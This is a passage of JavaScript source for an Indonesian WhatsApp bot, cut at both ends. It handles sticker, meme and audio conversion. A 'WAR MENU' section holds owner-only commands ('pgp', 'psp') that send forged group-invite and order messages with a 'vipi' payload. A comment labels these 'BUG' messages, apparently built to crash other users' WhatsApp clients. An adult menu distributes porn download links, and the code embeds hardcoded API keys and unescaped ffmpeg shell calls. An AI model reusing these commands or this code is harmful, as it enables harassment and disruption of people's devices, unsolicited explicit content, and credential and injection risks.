                                                        quoted: mek
                                                 })
                                                 fs.unlinkSync(media)
                                          })
                                          .on('end', () => {
                                                 _out = getRandom('.webp')
                                                 spawn('webpmux', ['-set', 'exif', './sticker/data.exif', out, '-o', _out])
                                                        .on('exit', () => {
                                                               dha.sendMessage(from, fs.readFileSync(_out), 'stickerMessage', {
                                                                      quoted: mek
                                                               })
                                                               fs.unlinkSync(out)
                                                               fs.unlinkSync(_out)
                                                               fs.unlinkSync(media)
                                                        })
                                          })
                                          .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                                          .toFormat('webp')
                                          .save(out)
                            } else {
                                   reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
                            }
                            break
                     case 'toimg':
                            if (!isQuotedSticker) return reply('reply stickernya')
                            reply(mess.wait)
                            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            media = await dha.downloadAndSaveMediaMessage(encmedia)
                            ran = getRandom('.png')
                            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                                   fs.unlinkSync(media)
                                   if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
                                   buffer = fs.readFileSync(ran)
                                   dha.sendMessage(from, buffer, image, {
                                          quoted: mek,
                                          caption: 'Nih'
                                   })
                                   fs.unlinkSync(ran)
                            })
                            break
                     case 'smeme':
                            reply('Loading.... ')
                            top = arg.split('|')[0]
                            bottom = arg.split('|')[1]
                            var imgbb = require('imgbb-uploader')
                            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
                                   ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   owgi = await dha.downloadAndSaveMediaMessage(ger)
                                   anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
                                   teks = `${anu.display_url}`
                                   ranp = getRandom('.gif')
                                   rano = getRandom('.webp')
                                   anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
                                   sendStickerUrl(from, `${anu1}`)
                            } else {
                                   reply('Gunakan foto/stiker!')
                            }
                            break

                     case 'memeimg':
                     case 'memegen':
                            top = arg.split('|')[0]
                            bottom = arg.split('|')[1]
                            var imgbb = require('imgbb-uploader')
                            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
                                   reply(mess.wait)
                                   ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   owgi = await dha.downloadAndSaveMediaMessage(ger)
                                   anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
                                   teks = `${anu.display_url}`
                                   ranp = getRandom('.gif')
                                   rano = getRandom('.webp')
                                   anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
                                   sendMediaURL(from, `${anu1}`, mess.success)
                            } else {
                                   reply('Gunakan foto/stiker!')
                            }
                            break
                     case 'togif':
                            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                                   reply(mess.wait)
                                   encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   mediaaa = await dha.downloadAndSaveMediaMessage(encmediaaa)
                                   a = await webp2gifFile(mediaaa)
                                   mp4 = await getBuffer(a.result)
                                   dha.sendMessage(from, mp4, video, {
                                          mimetype: 'video/gif',
                                          quoted: mek,
                                          caption: mess.success
                                   })
                                   fs.unlinkSync(mediaaa)
                            } else {
                                   reply(mess.wrongFormat)
                            }
                            break
                     case 'tovideo':
                            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                                   reply(mess.wait)
                                   encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   mediaaa = await dha.downloadAndSaveMediaMessage(encmediaaa)
                                   a = await webp2gifFile(mediaaa)
                                   mp4 = await getBuffer(a.result)
                                   dha.sendMessage(from, mp4, video, {
                                          mimetype: 'video/mp4',
                                          quoted: mek,
                                          caption: mess.success
                                   })
                                   fs.unlinkSync(mediaaa)
                            } else {
                                   reply(mess.wrongFormat)
                            }
                            break
                     case 'tomp3':
                            if (isQuotedVideo || isQuotedAudio) {
                                   reply(mess.wait)
                                   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                                   media = await dha.downloadAndSaveMediaMessage(encmedia)
                                   ran = getRandom('.mp3')
                                   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                                          fs.unlinkSync(media)
                                          if (err) return reply(`Err: ${err}`)
                                          buffer453 = fs.readFileSync(ran)
                                          dha.sendMessage(from, buffer453, audio, {
                                                 mimetype: 'audio/mp4',
                                                 quoted: mek
                                          })
                                          fs.unlinkSync(ran)
                                   })
                            } else {
                                   reply(mess.wrongFormat)
                            }
                            break
                            //------------------<18+ Menu>-----------------------   
                     case 'randombokep':
                            bokep = body.slice(1)
                            const bo = ['https://www.mediafire.com/download/8hnhjcf3pseubgy', 'https://www.mediafire.com/download/cty9phda3d1s62u', 'https://www.mediafire.com/download/8hnhjcf3pseubgy']
                            const kep = bo[Math.floor(Math.random() * bo.length)]
                            dha.sendMessage(from, '*PERMINTAAN:* ' + bokep + '\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* ' + kep, text, {
                                   quoted: ftoko,
                                   caption: `NI BOKEP SAYA DAPAT DARI *©hzkyx* DOSA TANGGUNG SENDIRI🗿`
                            })
                            break
                     case 'xnxx':
                            if (args.length == 0) return reply(`Contoh: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                            query = args.join(" ")
                            get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)
                            get_result = get_result.result
                            ini_txt = `Title : ${get_result.title}\n`
                            ini_txt += `Duration : ${get_result.duration}\n`
                            ini_txt += `View : ${get_result.view}\n`
                            ini_txt += `Rating : ${get_result.rating}\n`
                            ini_txt += `Like : ${get_result.like}\n`
                            ini_txt += `Dislike : ${get_result.dislike}\n`
                            ini_txt += `Comment : ${get_result.comment}\n`
                            ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                            ini_txt += `Description : ${get_result.description}\n`
                            ini_txt += "Link : \n"
                            ini_link = get_result.link
                            for (var x of ini_link) {
                                   ini_txt += `${x.type} - ${x.link}\n\n`
                            }
                            thumbnail = await getBuffer(get_result.thumbnail)
                            dha.sendMessage(from, thumbnail, image, {
                                   quoted: mek,
                                   caption: ini_txt
                            })
                            break
                     case 'xnxxsearch':
                            if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                            query = args.join(" ")
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)
                            get_result = get_result.result
                            ini_txt = ""
                            for (var x of get_result) {
                                   ini_txt += `Title : ${x.title}\n`
                                   ini_txt += `Views : ${x.views}\n`
                                   ini_txt += `Duration : ${x.duration}\n`
                                   ini_txt += `Uploader : ${x.uploader}\n`
                                   ini_txt += `Link : ${x.link}\n`
                                   ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                            }
                            reply(ini_txt)
                            break
                     case 'asupan1':
                            dha.updatePresence(from, Presence.composing)
                            reply(mess.wait)
                            data = fs.readFileSync('./lib/asupan.js');
                            jsonData = JSON.parse(data);
                            randIndex = Math.floor(Math.random() * jsonData.length);
                            randKey = jsonData[randIndex];
                            asupan = await getBuffer(randKey.result)
                            dha.sendMessage(from, asupan, video, {
                                   quoted: mek,
                                   caption: '```ASUPAN NIH:V```'
                            })
                            break
                     case 'asupan2':
                            dha.updatePresence(from, Presence.composing)
                            reply(mess.wait)
                            data = fs.readFileSync('./lib/asupan2.js');
                            jsonData = JSON.parse(data);
                            randIndex = Math.floor(Math.random() * jsonData.length);
                            randKey = jsonData[randIndex];
                            asupan = await getBuffer(randKey.result)
                            dha.sendMessage(from, asupan, video, {
                                   quoted: mek,
                                   caption: '```ASUPAN NIH:V```'
                            })
                            break
                            //------------------<WAR MENU>---------------    
                     case 'pvp':
                            if (!mek.key.fromMe && !isOwner) return
                            tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
                            dha.sendMessage(from, tapib1, document, {
                                   quoted: mek,
                                   filename: `NOIR BOT ~ 404 ${vipi}.mp3`,
                                   mimetype: 'audio/application'
                            })
                            await reply('Bang mau nanya')
                            break
                     case 'pgp':
                            if (!isOwner && !mek.key.fromMe) return
                            buf = Mfake
                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
                            imeg = imeu.message.imageMessage
                            res = await dha.prepareMessageFromContent(from, {
                                   "groupInviteMessage": {
                                          "groupJid": "85296556573-1328272333@g.us",
                                          "inviteCode": "wFHwtOxGQN8OwK2x",
                                          "inviteExpiration": "162533333338378",
                                          "groupName": `NOIR BOT ~ 404 ${vipi}`,
                                          "jpegThumbnail": "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",
                                          "caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
                                          "contextInfo": {
                                                 "forwardingScore": 3,
                                                 "isForwarded": true
                                          }
                                   }
                            }, {
                                   quoted: imeu,
                                   contextInfo: {}
                            })
                            hexa.relayWAMessage(res)
                            await setTimeout(() => {
                                   reply('Hacker ( NOIR BOT ~ 404 )')
                            }, 3000)
                            break
                     case 'psp': // BUG TROLLI + BUG GC + TROLLI
                            if (!mek.key.fromMe && !isOwner) return
                            buf = Mfake
                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
                            imeg = imeu.message.imageMessage
                            res = await dha.prepareMessageFromContent(from, {
                                   "orderMessage": {
                                          "orderId": "150453297177375",
